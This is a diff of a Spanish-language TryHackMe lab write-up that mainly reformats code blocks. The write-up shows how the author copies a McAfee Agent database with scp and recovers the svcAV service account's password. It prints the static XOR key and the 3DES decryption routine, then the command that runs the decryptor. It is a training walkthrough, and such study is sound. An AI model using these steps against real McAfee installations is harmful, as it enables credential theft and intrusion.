@@ -175,17 +175,20 @@ Proceso de explotación:
 
 Accedí a la ruta de la base de datos en el servidor Windows:
 
-cmd
+```cmd
 cd C:\ProgramData\McAfee\Agent\DB
 Extraje el archivo ma.db a mi AttackBox usando SCP:
+```
 
-bash
+```bash
 scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
-Abrí el archivo con sqlitebrowser y revisé la tabla AGENT_REPOSITORIES. Encontré el usuario svcAV y su contraseña ofuscada en el campo AUTH_PASSWD.
+```
+ Abrí el archivo con sqlitebrowser y revisé la tabla AGENT_REPOSITORIES. Encontré el usuario svcAV y su contraseña ofuscada en el campo AUTH_PASSWD.
+
 Análisis del script de desencriptación:
 McAfee usa una clave estática para proteger esta contraseña. Analizando el script mcafee_sitelist_pwd_decrypt.py, noté que el proceso de descifrado hace dos cosas:
 
-python
+```python
 # 1. Clave XOR estática
 KEY = "12150F10111C1A060A1F1B1817160519".decode("hex")
 
@@ -199,12 +202,13 @@ def des3_ecb_decrypt(data):
     des3 = DES3.new(key, DES3.MODE_ECB, "")
     decrypted = des3.decrypt(data)
     return decrypted[0:decrypted.find('\x00')] or "<empty>"
-El script decodifica el Base64, aplica una operación XOR con la clave estática y finalmente descifra el resultado usando 3DES (modo ECB).
-
+# El script decodifica el Base64, aplica una operación XOR con la clave estática y finalmente descifra el resultado usando 3DES (modo ECB).
+```
 Ejecución:
 
-bash
+```bash
 python2 mcafee_sitelist_pwd_decrypt.py <AUTH_PASSWD_VALUE>
+```
 Resultado: El script me devolvió la contraseña de la cuenta svcAV en texto plano.
 
 ### Task 8: Conclusiones y Mitigaciones
